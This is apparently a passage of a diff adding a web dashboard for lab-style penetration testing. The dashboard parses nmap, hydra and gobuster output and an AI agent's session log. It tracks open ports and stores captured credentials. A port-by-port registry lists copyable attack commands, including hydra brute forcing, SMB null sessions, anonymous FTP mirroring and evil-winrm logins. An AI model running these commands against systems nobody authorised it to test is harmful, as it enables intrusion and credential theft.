+<!-- ============== ESCALATION OVERLAY ============== -->
+<div id="esc-overlay">
+  <div id="esc-grid"></div>
+  <div id="esc-rings"><span></span><span></span><span></span></div>
+  <div id="esc-card">
+    <div id="esc-stage-label">SHELL ACQUIRED</div>
+    <div id="esc-stage-name">USER</div>
+    <div id="esc-progress">
+      <div class="esc-pip" data-pip="recon"><span>RECON</span></div>
+      <div class="esc-pip" data-pip="foothold"><span>FOOTHOLD</span></div>
+      <div class="esc-pip active" data-pip="user"><span>USER SHELL</span></div>
+      <div class="esc-pip" data-pip="enum"><span>POST-EXPL</span></div>
+      <div class="esc-pip" data-pip="root"><span>ROOT</span></div>
+    </div>
+    <div id="esc-banner"></div>
+  </div>
+</div>
+
+<!-- ============== HEARTBEAT BAR (always pulsing) ============== -->
+<div id="heartbeat"><canvas id="hb-canvas"></canvas></div>
+
+<script>
+"use strict";
+
+/* ===================================================================
+   STATE
+   =================================================================== */
+const state = {
+  theme:        localStorage.getItem("thm-theme") || "tactical",
+  target:       "—",
+  startedAt:    null,
+  command:      "—",
+  logPath:      null,
+  logOffset:    0,
+  sessionPath:  null,
+  eventOffset:  0,
+  activeTool:   null,
+  phase:        "IDLE",
+  phaseIdx:     -1,
+  phaseStarts:  {},
+  phases:       [],
+  services:     {},
+  creds:        [],
+  view:         "ops",
+  telLines:     0,
+  lastFresh:    0,
+  liveUntil:    0,
+};
+
+/* ===================================================================
+   TOOL REGISTRY — phase scripts, written in hacker voice
+   =================================================================== */
+const PHASE_SETS = {
+  nmap: {
+    verb: "MAP",
+    tagline: "Port reconnaissance — what's listening and what is it?",
+    why: "You can't attack what you can't see. Nmap is the airborne radar of a pentest: it tells you which doors are open, what's behind them, and roughly how old the locks are. Every later step depends on it being thorough.",
+    phases: [
+      { id:"init",    name:"Init",       sub:"sockets, host check",
+        doing:"Setting up raw sockets, resolving target, choosing scan mode.",
+        watch:["Permission errors (need sudo for SYN scan)","Host appearing down (try -Pn)","DNS resolution miss"] },
+      { id:"discover",name:"Discover",   sub:"is host alive?",
+        doing:"Pinging the target with ICMP / ARP / TCP probes to confirm it responds.",
+        watch:["Firewalls dropping ICMP","Host filtered","Latency spikes"] },
+      { id:"sweep",   name:"Sweep",      sub:"top ports first",
+        doing:"Knocking on the top 1000 TCP ports to find anything listening.",
+        watch:["Tarpits / honeypots","Filtered vs closed responses","Rate-limit drops"] },
+      { id:"banner",  name:"Banner",     sub:"-sV service grab",
+        doing:"Negotiating with each open port to identify the software and version.",
+        watch:["Outdated versions = known CVEs","Mismatched banners (decoys)","Custom service strings"] },
+      { id:"script",  name:"Scripts",    sub:"-sC default NSE",
+        doing:"Running the default NSE script set against open ports for free intel.",
+        watch:["SMB null sessions","Anonymous FTP","Cert details on HTTPS"] },
+      { id:"report",  name:"Report",     sub:"finalize map",
+        doing:"Compiling output. This is when the surface area is final.",
+        watch:["Total open ports","Unusual high ports","Anything in <1024 you didn't expect"] },
+    ]
+  },
+  hydra: {
+    verb: "BREAK",
+    tagline: "Online password attack — guessing until the lock opens.",
+    why: "Hydra throws credentials at a live service in parallel. Every line is a real authentication attempt against the target. The goal isn't elegance — it's finding the first valid login that lets you stop guessing and start moving.",
+    phases: [
+      { id:"load",    name:"Load",       sub:"wordlist + targets",
+        doing:"Loading the user and password lists into memory and preparing tasks.",
+        watch:["List size (millions take forever)","Encoding gotchas","Wrong protocol flag"] },
+      { id:"connect", name:"Connect",    sub:"open sockets",
+        doing:"Opening parallel connections to the target service.",
+        watch:["Connection refused","Service rate-limiting","Account lockouts"] },
+      { id:"attempt", name:"Attempt",    sub:"credentials in flight",
+        doing:"Sending login attempts in parallel — keep an eye on the STATUS lines.",
+        watch:["c/m = creds per minute","Tries remaining","Suspicious silence"] },
+      { id:"status",  name:"Status",     sub:"speed + ETA",
+        doing:"Hydra is reporting throughput. Use this to estimate when it finishes.",
+        watch:["c/m suddenly drops → server pushback","ETA shifting","Errors spiking"] },
+      { id:"match",   name:"Match",      sub:"valid login found",
+        doing:"Listening for the line that contains 'login:' and 'password:'.",
+        watch:["The hit line in green","False positives on weird services","Logging-out behavior"] },
+      { id:"done",    name:"Done",       sub:"persist + pivot",
+        doing:"Saving the credential and planning the next protocol to try it on.",
+        watch:["Same creds reused elsewhere","SSH/SMB password reuse","Promote to admin"] },
+    ]
+  },
+  gobuster: {
+    verb: "WALK",
+    tagline: "Content discovery — finding paths the server doesn't advertise.",
+    why: "Web apps often have admin panels, backup files, and forgotten endpoints that aren't linked from any page. Gobuster bruteforces a wordlist of likely paths against the server and reports what doesn't return a 404. It's the difference between a homepage and a hidden control room.",
+    phases: [
+      { id:"init",    name:"Init",       sub:"wordlist load",
+        doing:"Loading the wordlist (common.txt, raft, etc) and parsing flags.",
+        watch:["Wordlist too small/large","Extension list (-x)","Threads count"] },
+      { id:"probe",   name:"Probe",      sub:"baseline request",
+        doing:"Sending a baseline request to learn what 'not found' looks like on this server.",
+        watch:["Custom 404 pages","WAF banner","Redirect behavior"] },
+      { id:"walk",    name:"Walk",       sub:"request fan-out",
+        doing:"Firing concurrent requests, comparing response codes and sizes.",
+        watch:["200 OKs (interesting)","301/302 redirects","403 forbidden (it exists)"] },
+      { id:"filter",  name:"Filter",     sub:"size / status cutoff",
+        doing:"Filtering out the noise — same-size responses are probably 404 in disguise.",
+        watch:["Suspicious response sizes","Status code variety","Throttling errors"] },
+      { id:"verify",  name:"Verify",     sub:"manual confirm",
+        doing:"Hits worth checking by hand. Don't trust the tool blindly.",
+        watch:["/admin /backup /api","Source-map leaks","Index-of pages"] },
+      { id:"done",    name:"Done",       sub:"compile list",
+        doing:"All paths walked. Time to triage the findings.",
+        watch:["Total hits","High-value paths","Recursive targets"] },
+    ]
+  },
+  idle: {
+    verb: "STANDBY",
+    tagline: "Awaiting tool signature on telemetry stream.",
+    why: "Every step has a purpose. When a tool runs, this panel explains what the operator is trying to learn and why it moves the engagement forward.",
+    phases: [
+      { id:"wait",    name:"Standby",    sub:"awaiting input",
+        doing:"Nothing yet — start a tool and the HUD will identify it automatically.",
+        watch:["The HUD will populate this list as the tool runs."] },
+      { id:"_1",      name:"—",  sub:"",
+        doing:"", watch:[] },
+      { id:"_2",      name:"—",  sub:"",
+        doing:"", watch:[] },
+      { id:"_3",      name:"—",  sub:"",
+        doing:"", watch:[] },
+      { id:"_4",      name:"—",  sub:"",
+        doing:"", watch:[] },
+      { id:"_5",      name:"—",  sub:"",
+        doing:"", watch:[] },
+    ]
+  }
+};
+
+/* ===================================================================
+   SERVICE REGISTRY — port dossiers
+   =================================================================== */
+const SERVICES = {
+  "21":   { name:"FTP",   desc:"File Transfer Protocol. Cleartext credentials. Often allows anonymous login.",
+    vectors: [
+      "ftp $T",
+      "nmap -sV -p PORT --script ftp-anon,ftp-syst $T",
+      "hydra -L users.txt -P rockyou.txt ftp://$T",
+      "wget -m --no-passive ftp://anonymous:anon@$T:PORT"
+    ]},
+  "22":   { name:"SSH",   desc:"Secure Shell. Strong protocol; weakness usually in credentials, keys, or version.",
+    vectors: [
+      "ssh root@$T -p PORT",
+      "nmap -sV -p PORT --script ssh-auth-methods,ssh2-enum-algos $T",
+      "hydra -L users.txt -P rockyou.txt ssh://$T:PORT -t 4",
+      "ssh-keyscan -p PORT $T"
+    ]},
+  "23":   { name:"TELNET",desc:"Cleartext remote shell. Treat any open telnet as a gift.",
+    vectors: [
+      "telnet $T PORT",
+      "nmap -sV -p PORT --script telnet-encryption,telnet-ntlm-info $T",
+      "hydra -L users.txt -P rockyou.txt telnet://$T:PORT"
+    ]},
+  "25":   { name:"SMTP",  desc:"Mail relay. Useful for user enumeration via VRFY/EXPN/RCPT.",
+    vectors: [
+      "nc $T PORT",
+      "nmap -sV -p PORT --script smtp-enum-users,smtp-commands,smtp-vuln-* $T",
+      "smtp-user-enum -M VRFY -U users.txt -t $T"
+    ]},
+  "53":   { name:"DNS",   desc:"Name service. Try zone transfer; reveals internal hostnames.",
+    vectors: [
+      "dig axfr @$T",
+      "dnsenum --dnsserver $T target.local",
+      "nmap -sV -p PORT --script dns-zone-transfer,dns-recursion $T"
+    ]},
+  "80":   { name:"HTTP",  desc:"Web app. The biggest attack surface on most boxes — content, params, auth, logic.",
+    vectors: [
+      "curl -i http://$T:PORT/",
+      "gobuster dir -u http://$T:PORT/ -w /usr/share/wordlists/dirb/common.txt",
+      "nikto -h http://$T:PORT/",
+      "whatweb http://$T:PORT/",
+      "ffuf -u http://$T:PORT/FUZZ -w wordlist.txt -fc 404"
+    ]},
+  "110":  { name:"POP3",  desc:"Mail retrieval. Cleartext auth by default.",
+    vectors: [
+      "nc $T PORT",
+      "nmap -sV -p PORT --script pop3-capabilities,pop3-brute $T",
+      "hydra -L users.txt -P rockyou.txt pop3://$T:PORT"
+    ]},
+  "111":  { name:"RPCBIND",desc:"Portmapper. Lists all RPC services; often exposes NFS exports.",
+    vectors: [
+      "rpcinfo -p $T",
+      "showmount -e $T",
+      "nmap -sV -p PORT --script rpcinfo,nfs-ls,nfs-showmount $T"
+    ]},
+  "139":  { name:"SMB",   desc:"NetBIOS session. Same surface as 445 — null sessions, shares, user lists.",
+    vectors: [
+      "enum4linux -a $T",
+      "smbclient -L //$T/ -N",
+      "nmap -sV -p PORT --script smb-os-discovery,smb-enum-shares,smb-enum-users $T"
+    ]},
+  "143":  { name:"IMAP",  desc:"Mail retrieval. Auth often cleartext on PORT 143.",
+    vectors: [
+      "nc $T PORT",
+      "nmap -sV -p PORT --script imap-capabilities,imap-brute $T",
+      "hydra -L users.txt -P rockyou.txt imap://$T:PORT"
+    ]},
+  "443":  { name:"HTTPS", desc:"Encrypted HTTP. Same web surface — plus cert info, SNI, weak ciphers.",
+    vectors: [
+      "curl -ki https://$T:PORT/",
+      "openssl s_client -connect $T:PORT -showcerts",
+      "gobuster dir -u https://$T:PORT/ -w wordlist.txt -k",
+      "sslscan $T:PORT",
+      "nmap -sV -p PORT --script ssl-enum-ciphers,http-enum $T"
+    ]},
+  "445":  { name:"SMB",   desc:"Modern SMB. Shares, user enumeration, EternalBlue-class bugs.",
+    vectors: [
+      "enum4linux -a $T",
+      "smbclient -L //$T/ -N",
+      "smbmap -H $T",
+      "nmap -sV -p PORT --script smb-vuln-* $T",
+      "crackmapexec smb $T -u '' -p ''"
+    ]},
+  "1433": { name:"MSSQL", desc:"Microsoft SQL Server. xp_cmdshell if you find creds.",
+    vectors: [
+      "impacket-mssqlclient $T -windows-auth",
+      "nmap -sV -p PORT --script ms-sql-info,ms-sql-empty-password $T",
+      "hydra -L users.txt -P rockyou.txt mssql://$T:PORT"
+    ]},
+  "3306": { name:"MYSQL", desc:"MySQL/MariaDB. Often weakly authenticated; UDF for RCE if root.",
+    vectors: [
+      "mysql -h $T -u root -p",
+      "nmap -sV -p PORT --script mysql-info,mysql-empty-password,mysql-users $T",
+      "hydra -L users.txt -P rockyou.txt mysql://$T:PORT"
+    ]},
+  "3389": { name:"RDP",   desc:"Remote Desktop. Bluekeep on old Windows; creds give you the box.",
+    vectors: [
+      "xfreerdp /v:$T:PORT /u:admin",
+      "nmap -sV -p PORT --script rdp-enum-encryption,rdp-vuln-ms12-020 $T",
+      "hydra -L users.txt -P rockyou.txt rdp://$T:PORT"
+    ]},
+  "5985": { name:"WINRM", desc:"Windows Remote Management. Need credentials; gives full PS shell.",
+    vectors: [
+      "evil-winrm -i $T -u admin -p 'pass'",
+      "crackmapexec winrm $T -u users.txt -p passwords.txt",
+      "nmap -sV -p PORT --script http-wsdl-discover $T"
+    ]},
+  "8080": { name:"HTTP-ALT",desc:"Common dev/admin web service port. Tomcat, Jenkins, proxies all live here.",
+    vectors: [
+      "curl -i http://$T:PORT/",
+      "curl -i http://$T:PORT/manager/html",
+      "gobuster dir -u http://$T:PORT/ -w /usr/share/wordlists/dirb/common.txt",
+      "nmap -sV -p PORT --script http-enum,http-title $T"
+    ]},
+  "default":{name:"UNKNOWN",desc:"Non-standard port. Treat it as a black box until banner-grabbing tells you more.",
+    vectors: [
+      "nc -v $T PORT",
+      "nmap -sV -A -p PORT $T",
+      "curl -i http://$T:PORT/"
+    ]}
+};
+
+/* ===================================================================
+   DOM HELPERS
+   =================================================================== */
+const $  = (sel,root=document) => root.querySelector(sel);
+const $$ = (sel,root=document) => Array.from(root.querySelectorAll(sel));
+
+function el(tag, attrs={}, ...kids) {
+  const node = document.createElement(tag);
+  for (const [k,v] of Object.entries(attrs)) {
+    if (k === "class") node.className = v;
+    else if (k === "html") node.innerHTML = v;
+    else if (k.startsWith("on")) node.addEventListener(k.slice(2), v);
+    else node.setAttribute(k, v);
+  }
+  for (const k of kids) {
+    if (k == null) continue;
+    if (typeof k === "string") node.appendChild(document.createTextNode(k));
+    else node.appendChild(k);
+  }
+  return node;
+}
+
+function fmtTime(ms) {
+  const s = Math.floor(ms/1000);
+  const h = String(Math.floor(s/3600)).padStart(2,"0");
+  const m = String(Math.floor((s%3600)/60)).padStart(2,"0");
+  const ss= String(s%60).padStart(2,"0");
+  return `${h}:${m}:${ss}`;
+}
+function nowHHMMSS(d=new Date()) {
+  return String(d.getHours()).padStart(2,"0")+":"+
+         String(d.getMinutes()).padStart(2,"0")+":"+
+         String(d.getSeconds()).padStart(2,"0");
+}
+
+/* ===================================================================
+   THEME
+   =================================================================== */
+function applyTheme(t) {
+  state.theme = t;
+  document.body.setAttribute("data-theme", t);
+  localStorage.setItem("thm-theme", t);
+}
+applyTheme(state.theme);
+$("#btn-theme").addEventListener("click", () => {
+  applyTheme(state.theme === "tactical" ? "neon" : "tactical");
+  toast(`Theme → ${state.theme.toUpperCase()}`, "warn");
+});
+
+/* ===================================================================
+   TOASTS
+   =================================================================== */
+function toast(msg, level="good", ttl=3500) {
+  const t = el("div", { class: "toast" + (level==="warn"?" warn":level==="bad"?" bad":"") }, msg);
+  $("#toast-stack").appendChild(t);
+  setTimeout(() => { t.style.opacity="0"; t.style.transform="translateX(20px)"; t.style.transition="all .3s"; }, ttl-300);
+  setTimeout(() => t.remove(), ttl);
+}
+
+/* ===================================================================
+   TELEMETRY STREAM
+   =================================================================== */
+const MAX_TEL = 800;
+function isNearBottom(el) {
+  return (el.scrollHeight - el.scrollTop - el.clientHeight) < 60;
+}
+function pushLine({ts, src, msg, level}) {
+  const body = $("#tel-body");
+  const stick = isNearBottom(body);
+  const line = el("div",
+    { class: "log-line" + (level ? " "+level : "") },
+    el("span", { class: "ts" }, ts || nowHHMMSS()),
+    el("span", { class: "src src-" + (src||"ops").toLowerCase() }, (src||"OPS")),
+    el("span", { class: "msg" }, msg)
+  );
+  body.appendChild(line);
+  state.telLines++;
+  while (body.childElementCount > MAX_TEL) body.removeChild(body.firstChild);
+  $("#tel-count").textContent = state.telLines + " lines";
+  if (stick) body.scrollTop = body.scrollHeight;
+  // status LED — live for a moment
+  state.liveUntil = Date.now() + 4000;
+  updateLED();
+}
+function updateLED() {
+  const live = Date.now() < state.liveUntil;
+  const led = $("#status-led");
+  if (live) { led.classList.add("live"); $("#status-text").textContent = "LIVE"; }
+  else      { led.classList.remove("live"); $("#status-text").textContent = "STANDBY"; }
+}
+setInterval(updateLED, 700);
+
+$("#btn-clear-tel").addEventListener("click", () => {
+  $("#tel-body").innerHTML = "";
+  state.telLines = 0;
+  $("#tel-count").textContent = "0 lines";
+});
+
+/* ===================================================================
+   PHASES — render strip from active tool's PHASE_SETS
+   =================================================================== */
+function renderPhases() {
+  const strip = $("#phase-strip");
+  strip.innerHTML = "";
+  state.phases.forEach((p, i) => {
+    const node = el("div",
+      { class: "phase" + (i < state.phaseIdx ? " done" : "") + (i === state.phaseIdx ? " active" : "") },
+      el("span", { class: "idx" }, "P" + (i+1)),
+      el("span", { class: "name" }, p.name),
+      el("span", { class: "sub" }, p.sub)
+    );
+    if (i < state.phaseIdx && state.phaseStarts[i]) {
+      const dur = (state.phaseStarts[i+1] || Date.now()) - state.phaseStarts[i];
+      node.appendChild(el("span", { class:"elapsed" }, fmtTime(dur)));
+    }
+    strip.appendChild(node);
+  });
+}
+function renderOpPane() {
+  const tool = state.activeTool || "idle";
+  const ts = PHASE_SETS[tool];
+  $("#op-name").textContent = (tool === "idle" ? "STANDBY" : tool.toUpperCase());
+  $("#op-tagline").textContent = ts.tagline;
+  const ph = ts.phases[Math.max(0, state.phaseIdx)] || ts.phases[0];
+  $("#op-doing").textContent = ph.doing || "—";
+  $("#op-why").textContent = ts.why;
+  const wl = $("#op-watch");
+  wl.innerHTML = "";
+  (ph.watch || []).forEach(w => wl.appendChild(el("li", {}, w)));
+  $("#tb-phase").textContent = ph.name.toUpperCase();
+}
+function switchTool(name) {
+  if (state.activeTool === name) return;
+  state.activeTool = name;
+  state.phases = PHASE_SETS[name].phases.slice();
+  state.phaseIdx = 0;
+  state.phaseStarts = { 0: Date.now() };
+  if (name !== "idle") {
+    $("#d-source").textContent = name.toUpperCase();
+    $("#d-started").textContent = nowHHMMSS();
+    pushLine({src:"OPS", msg: `Tool signature detected: ${name.toUpperCase()} — loading phase script.`, level:"dim"});
+  }
+  renderPhases();
+  renderOpPane();
+}
+function advancePhase(toIdx) {
+  if (toIdx <= state.phaseIdx) return;
+  if (toIdx >= state.phases.length) toIdx = state.phases.length - 1;
+  for (let i = state.phaseIdx + 1; i <= toIdx; i++) {
+    state.phaseStarts[i] = Date.now();
+  }
+  state.phaseIdx = toIdx;
+  renderPhases();
+  renderOpPane();
+}
+
+/* ===================================================================
+   SERVICES PANEL
+   =================================================================== */
+function renderServices() {
+  const body = $("#svc-body");
+  body.innerHTML = "";
+  const ports = Object.keys(state.services).map(Number).sort((a,b) => a-b);
+  $("#svc-count").textContent = ports.length;
+  $("#tb-openports").textContent = ports.length;
+  if (!ports.length) {
+    body.appendChild(el("div", { class:"h-label", style:"color:var(--fg-dim); padding: 12px 0;" },
+      "No open ports observed yet. Run a port scan against the target."));
+    return;
+  }
+  for (const p of ports) {
+    const s = state.services[p];
+    const dossier = SERVICES[String(p)] || SERVICES.default;
+    const card = el("div", { class: "svc-card" });
+    const head = el("div",
+      { class: "svc-head", onclick: () => card.classList.toggle("open") },
+      el("span", { class:"svc-port" }, String(p)),
+      el("div", {},
+        el("div", { class:"svc-name" }, (s.service || dossier.name)),
+        el("div", { class:"svc-ver" }, s.version || "—")
+      ),
+      el("span", { class:"svc-caret" }, "▾")
+    );
+    card.appendChild(head);
+    const body2 = el("div", { class:"svc-body" },
+      el("p", {}, dossier.desc)
+    );
+    const vecs = el("div", { class:"svc-vectors" });
+    for (const v of dossier.vectors) {
+      const cmd = v.replace(/\$T/g, state.target).replace(/PORT/g, String(p));
+      const row = el("div", { class:"svc-vector" },
+        el("code", {}, cmd),
+        el("button", { class:"copy", onclick: (e) => {
+          e.stopPropagation();
+          navigator.clipboard.writeText(cmd);
+          toast("Copied → " + cmd.slice(0,52) + (cmd.length>52?"…":""));
+        } }, "COPY")
+      );
+      vecs.appendChild(row);
+    }
+    body2.appendChild(vecs);
+    card.appendChild(body2);
+    body.appendChild(card);
+  }
+}
+function noteOpenPort(port, service, version) {
+  port = Number(port);
+  if (!port) return;
+  const prev = state.services[port] || {};
+  state.services[port] = {
+    service: service || prev.service || "",
+    version: version || prev.version || ""
+  };
+  renderServices();
+}
+
+/* ===================================================================
+   LOG PARSER — autodetect tool + phase from line content
+   =================================================================== */
+function detectToolFromLine(line) {
+  const l = line.toLowerCase();
+  if (/^starting nmap|nmap scan report|nmap done/i.test(line)) return "nmap";
+  if (/discovered open port/i.test(line)) return "nmap";
+  if (/^hydra |hydra v[\d.]+|\[status\] .*tries\/min|\[\d+\]\[\w+\] host:/i.test(line)) return "hydra";
+  if (/^gobuster|===============================================================|\(status: \d+\)/i.test(line)) return "gobuster";
+  return null;
+}
+function detectPhaseIdx(tool, line) {
+  if (tool === "nmap") {
+    if (/^starting nmap/i.test(line))           return 0;
+    if (/host is up|host seems down/i.test(line)) return 1;
+    if (/discovered open port/i.test(line))     return 2;
+    if (/service info|version/i.test(line))     return 3;
+    if (/nse:|script results|\|_/i.test(line))  return 4;
+    if (/nmap done/i.test(line))                return 5;
+  } else if (tool === "hydra") {
+    if (/hydra v[\d.]+|will use|data to attack/i.test(line))    return 0;
+    if (/starting attack|max\s*\d+\s*task/i.test(line))         return 1;
+    if (/\[attempt\]/i.test(line))                              return 2;
+    if (/\[status\]/i.test(line))                               return 3;
+    if (/login:\s*\S+\s+password:/i.test(line))                 return 4;
+    if (/finished|completed/i.test(line))                       return 5;
+  } else if (tool === "gobuster") {
+    if (/^gobuster v|wordlist:/i.test(line))                    return 0;
+    if (/^starting gobuster|status codes/i.test(line))          return 1;
+    if (/\(status: \d+\) \[size:/i.test(line))                  return 2;
+    if (/progress:/i.test(line))                                return 3;
+    if (/found:/i.test(line))                                   return 4;
+    if (/finished/i.test(line))                                 return 5;
+  }
+  return -1;
+}
+function classifyLine(line) {
+  if (/discovered open port/i.test(line)) return "good";
+  if (/login:\s*\S+\s+password:/i.test(line)) return "good";
+  if (/\[status\]/i.test(line)) return "warn";
+  if (/\[err|error|refused|filtered|timed out/i.test(line)) return "bad";
+  if (/found:|\(status: 200/i.test(line)) return "good";
+  return null;
+}
+function parseLogLine(line) {
+  if (!line || !line.trim()) return;
+
+  // Capture command line if present
+  const cmd = line.match(/\$ (.+)$/);
+  if (cmd && state.command === "—") {
+    state.command = cmd[1].trim();
+    $("#d-cmd").textContent = state.command;
+  }
+  // Target detection
+  const ipm = line.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);
+  if (ipm && state.target === "—") {
+    state.target = ipm[1];
+    $("#tb-target").textContent = state.target;
+    state.startedAt = state.startedAt || Date.now();
+    renderServices();
+  }
+
+  // Tool detection
+  const t = detectToolFromLine(line);
+  if (t && t !== state.activeTool) switchTool(t);
+
+  // Phase detection
+  if (state.activeTool) {
+    const idx = detectPhaseIdx(state.activeTool, line);
+    if (idx >= 0) advancePhase(idx);
+  }
+
+  // Open ports
+  const op = line.match(/Discovered open port\s+(\d+)\/(tcp|udp)/i);
+  if (op) noteOpenPort(op[1], "", "");
+  const portState = line.match(/^(\d+)\/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+))?$/i);
+  if (portState) noteOpenPort(portState[1], portState[3], (portState[4]||"").trim());
+
+  // Hydra hit
+  const hit = line.match(/host:\s*(\S+).*login:\s*(\S+)\s+password:\s*(\S+)/i);
+  if (hit) {
+    const cred = { service: state.activeTool === "hydra" ? "hydra" : "?",
+                   host: hit[1], username: hit[2], password: hit[3], source: "hydra", notes: line.trim() };
+    toast(`CRED CAPTURED → ${cred.username}:${cred.password}`, "good", 5000);
+    fetch("/api/creds", { method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify(cred) }).catch(()=>{});
+    advancePhase(4);
+  }
+
+  pushLine({ src:"TOOL", msg: line, level: classifyLine(line) });
+  detectShellEvent(line);
+}
+
+/* ===================================================================
+   POLLING — logs + tail
+   =================================================================== */
+async function fetchJSON(url, opts) {
+  try {
+    const r = await fetch(url, opts);
+    if (!r.ok) return null;
+    return await r.json();
+  } catch { return null; }
+}
+async function pollLogList() {
+  const res = await fetchJSON("/api/logs");
+  if (!res || !Array.isArray(res.logs)) return;
+
+  const sel = $("#log-source");
+  const cur = sel.value;
+  const opts = [`<option value="">auto-detect</option>`];
+  for (const f of res.logs) opts.push(`<option value="${f.path}">${f.name||f.path}</option>`);
+  sel.innerHTML = opts.join("");
+  if (cur) sel.value = cur;
+
+  if (!state.logPath || sel.value) {
+    let pick = res.logs.find(f => f.path === sel.value);
+    if (!pick) {
+      // strongly prefer ops.log if recent
+      pick = res.logs.find(f => /ops\.log$/.test(f.path) && (Date.now() - (f.mtime||0)*1000 < 60000));
+      if (!pick) pick = res.logs[0];
+    }
+    if (pick && pick.path !== state.logPath) {
+      state.logPath = pick.path;
+      state.logOffset = 0;
+      pushLine({ src:"OPS", msg:`Tailing log → ${pick.path}`, level:"dim" });
+    }
+  }
+}
+async function pollLogTail() {
+  if (!state.logPath) return;
+  const u = `/api/logtail?path=${encodeURIComponent(state.logPath)}&offset=${state.logOffset}`;
+  const res = await fetchJSON(u);
+  if (!res) return;
+  if (typeof res.offset === "number") state.logOffset = res.offset;
+  if (res.lines && res.lines.length) {
+    for (const ln of res.lines) parseLogLine(ln);
+    state.lastFresh = Date.now();
+    updateFreshness();
+  }
+}
+
+/* ===================================================================
+   POLLING — sessions / events (Claude conversation)
+   =================================================================== */
+function stripMeta(s) {
+  return String(s)
+    .replace(/<system-reminder>[\s\S]*?<\/system-reminder>/g, "")
+    .replace(/<task-notification>[\s\S]*?<\/task-notification>/g, "")
+    .replace(/<command-name>[\s\S]*?<\/command-name>/g, "")
+    .replace(/<command-message>[\s\S]*?<\/command-message>/g, "")
+    .replace(/<command-args>[\s\S]*?<\/command-args>/g, "")
+    .replace(/<local-command-stdout>[\s\S]*?<\/local-command-stdout>/g, "")
+    .replace(/<ide_selection>[\s\S]*?<\/ide_selection>/g, "")
+    .trim();
+}
+function renderEvent(ev) {
+  if (!ev) return;
+  const t = ev.type || "";
+  if (t === "assistant_text" || (ev.role === "assistant" && ev.text)) {
+    const text = stripMeta(ev.text || "");
+    if (text) pushLine({ src:"CLAUDE", msg: text.length>500 ? text.slice(0,500)+"…" : text });
+  } else if (t === "user_text" || (ev.role === "user" && ev.text)) {
+    const text = stripMeta(ev.text || "");
+    if (text) pushLine({ src:"YOU", msg: text.length>500 ? text.slice(0,500)+"…" : text });
+  } else if (t === "tool_use") {
+    pushLine({ src:"TOOL", msg: `▶ ${ev.name || "tool"} ${ev.input_preview ? "— " + ev.input_preview : ""}`, level:"dim" });
+  } else if (t === "tool_result") {
+    const text = stripMeta(ev.text || "");
+    if (text) {
+      pushLine({ src:"RESULT", msg: text.length>400 ? text.slice(0,400)+"…" : text, level:"dim" });
+      // scan tool_result text for shell pop signals — Bash output land here
+      text.split("\n").forEach(detectShellEvent);
+    }
+  }
+}
+async function pollSessions() {
+  const res = await fetchJSON("/api/sessions");
+  if (!res || !Array.isArray(res.sessions)) return;
+  const fresh = res.sessions.filter(s => Date.now() - (s.mtime||0)*1000 < 60000)
+                            .sort((a,b)=>(b.mtime||0)-(a.mtime||0));
+  if (fresh.length) {
+    const pick = fresh[0];
+    if (pick.path !== state.sessionPath) {
+      state.sessionPath = pick.path;
+      state.eventOffset = 0;
+      pushLine({ src:"OPS", msg:`Subscribed to session → ${pick.path}`, level:"dim" });
+    }
+  }
+}
+async function pollEvents() {
+  if (!state.sessionPath) return;
+  const u = `/api/events?path=${encodeURIComponent(state.sessionPath)}&offset=${state.eventOffset}`;
+  const res = await fetchJSON(u);
+  if (!res) return;
+  if (typeof res.offset === "number") state.eventOffset = res.offset;
+  if (res.events && res.events.length) {
+    for (const ev of res.events) renderEvent(ev);
+    state.lastFresh = Date.now();
+    updateFreshness();
+  }
+}
+
+function updateFreshness() {
+  const f = $("#freshness");
+  if (!state.lastFresh) { f.textContent = "last update —"; return; }
+  const s = Math.floor((Date.now() - state.lastFresh) / 1000);
+  f.textContent = `last update ${s}s ago`;
+}
+setInterval(updateFreshness, 1000);
+
+/* ===================================================================
+   ELAPSED TIMER
+   =================================================================== */
+setInterval(() => {
+  if (!state.startedAt) return;
+  $("#tb-elapsed").textContent = fmtTime(Date.now() - state.startedAt);
+}, 1000);
+
+/* ===================================================================
+   CREDS
+   =================================================================== */
+async function pollCreds() {
+  const r = await fetchJSON("/api/creds");
+  if (!r || !Array.isArray(r.creds)) return;
+  state.creds = r.creds;
+  $("#cred-badge").textContent = state.creds.length;
+  $("#cred-count2").textContent = state.creds.length;
+  if (state.view === "creds") renderCreds();
+}
+function renderCreds() {
+  const list = $("#cred-list");
+  list.innerHTML = "";
+  if (!state.creds.length) {
+    list.appendChild(el("div", { class:"h-label", style:"color:var(--fg-dim);" }, "No credentials captured yet."));
+    return;
+  }
+  state.creds.forEach((c,i) => {
+    const row = el("div", { class:"cred-card" },
+      el("div", { class:"cred-head" },
+        el("span", { class:"cred-svc" }, (c.service||"?").toUpperCase() + (c.host?(" @ "+c.host):"")),
+        el("span", { class:"cred-src" }, "via "+(c.source||"manual"))
+      ),
+      el("div", { class:"cred-row" },
+        el("span", { class:"k" }, "User"),
+        el("span", { class:"v" }, c.username||""),
+        el("div", { class:"cred-actions" },
+          el("button", { onclick: ()=>{ navigator.clipboard.writeText(c.username||""); toast("User copied"); } }, "COPY")
+        )
+      ),
+      el("div", { class:"cred-row" },
+        el("span", { class:"k" }, "Pass"),
+        el("span", { class:"v mono" }, c.password||""),
+        el("div", { class:"cred-actions" },
+          el("button", { onclick: () => { navigator.clipboard.writeText(c.password||""); toast("Password copied"); } }, "COPY"),
+          el("button", { class:"del", onclick: () => deleteCred(i) }, "DEL")
+        )
+      )
+    );
+    if (c.notes) row.appendChild(el("div", { class:"cred-notes" }, c.notes));
+    list.appendChild(row);
+  });
+}
+async function deleteCred(idx) {
+  await fetch("/api/creds?idx="+idx, { method:"DELETE" }).catch(()=>{});
+  pollCreds();
+}
+$("#cred-form").addEventListener("submit", async (ev) => {
+  ev.preventDefault();
+  const fd = new FormData(ev.target);
+  const cred = Object.fromEntries(fd.entries());
+  if (!cred.service && !cred.username && !cred.password) return;
+  cred.source = cred.source || "manual";
+  await fetch("/api/creds", { method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify(cred) }).catch(()=>{});
+  ev.target.reset();
+  toast("Credential stored");
+  pollCreds();
+});
+
+/* ===================================================================
+   TABS
+   =================================================================== */
+$$(".tab").forEach(t => t.addEventListener("click", () => {
+  $$(".tab").forEach(x => x.classList.remove("active"));
+  t.classList.add("active");
+  state.view = t.dataset.view;
+  document.body.classList.toggle("view-creds", state.view === "creds");
